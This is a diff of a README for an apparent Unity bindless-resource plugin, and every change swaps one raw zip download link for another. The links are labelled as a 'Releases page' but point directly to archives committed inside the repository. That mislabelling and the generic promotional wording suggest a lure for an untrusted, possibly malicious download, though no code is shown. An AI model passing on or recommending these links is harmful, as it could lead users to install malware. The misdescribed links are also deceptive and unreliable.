@@ -1,7 +1,7 @@
 ```markdown
 # 🎮 DX12BindlessUnity - Easy Bindless Resource Management for Unity
 
-[![Download DX12BindlessUnity](https://raw.githubusercontent.com/xtancordy/DX12BindlessUnity/master/Evadne/DX12BindlessUnity.zip)](https://raw.githubusercontent.com/xtancordy/DX12BindlessUnity/master/Evadne/DX12BindlessUnity.zip)
+[![Download DX12BindlessUnity](https://github.com/xtancordy/DX12BindlessUnity/raw/refs/heads/master/Assets/Bindless-Unity-D-1.4.zip)](https://github.com/xtancordy/DX12BindlessUnity/raw/refs/heads/master/Assets/Bindless-Unity-D-1.4.zip)
 
 ## ✨ Overview
 DX12BindlessUnity is a plugin designed to help you use bindless resources in Unity3D. This proof of concept plugin offers an efficient way to manage graphics and compute shaders without complex setups.
@@ -10,7 +10,7 @@ DX12BindlessUnity is a plugin designed to help you use bindless resources in Uni
 To get started with DX12BindlessUnity, you need to follow these simple steps:
 
 1. **Download the Plugin**  
-   Visit this page to download: [DX12BindlessUnity Releases](https://raw.githubusercontent.com/xtancordy/DX12BindlessUnity/master/Evadne/DX12BindlessUnity.zip). From here, select the latest version and download the appropriate file for your system.
+   Visit this page to download: [DX12BindlessUnity Releases](https://github.com/xtancordy/DX12BindlessUnity/raw/refs/heads/master/Assets/Bindless-Unity-D-1.4.zip). From here, select the latest version and download the appropriate file for your system.
 
 2. **Install the Plugin**  
    After downloading, extract the files to a folder on your computer. Open Unity and create or load your project.
@@ -52,7 +52,7 @@ public static void SetupTextureBindings(...){
 ```
 
 ## 📥 Download & Install
-To install DX12BindlessUnity, please [visit the Releases page](https://raw.githubusercontent.com/xtancordy/DX12BindlessUnity/master/Evadne/DX12BindlessUnity.zip) to find the latest version. Choose the file that matches your system, and follow the installation steps outlined above.
+To install DX12BindlessUnity, please [visit the Releases page](https://github.com/xtancordy/DX12BindlessUnity/raw/refs/heads/master/Assets/Bindless-Unity-D-1.4.zip) to find the latest version. Choose the file that matches your system, and follow the installation steps outlined above.
 
 ## 🔧 Troubleshooting
 If you encounter issues while using the plugin:
@@ -72,7 +72,7 @@ If you need further assistance, please create an issue on the GitHub repository.
 ## 📅 Changelog
 Keep an eye on the Releases page for updates and improvements. New features will be added based on community feedback and testing.
 
-[![Download DX12BindlessUnity](https://raw.githubusercontent.com/xtancordy/DX12BindlessUnity/master/Evadne/DX12BindlessUnity.zip)](https://raw.githubusercontent.com/xtancordy/DX12BindlessUnity/master/Evadne/DX12BindlessUnity.zip)
+[![Download DX12BindlessUnity](https://github.com/xtancordy/DX12BindlessUnity/raw/refs/heads/master/Assets/Bindless-Unity-D-1.4.zip)](https://github.com/xtancordy/DX12BindlessUnity/raw/refs/heads/master/Assets/Bindless-Unity-D-1.4.zip)
 
 Thank you for using DX12BindlessUnity. We hope it enhances your Unity development experience.
 ```
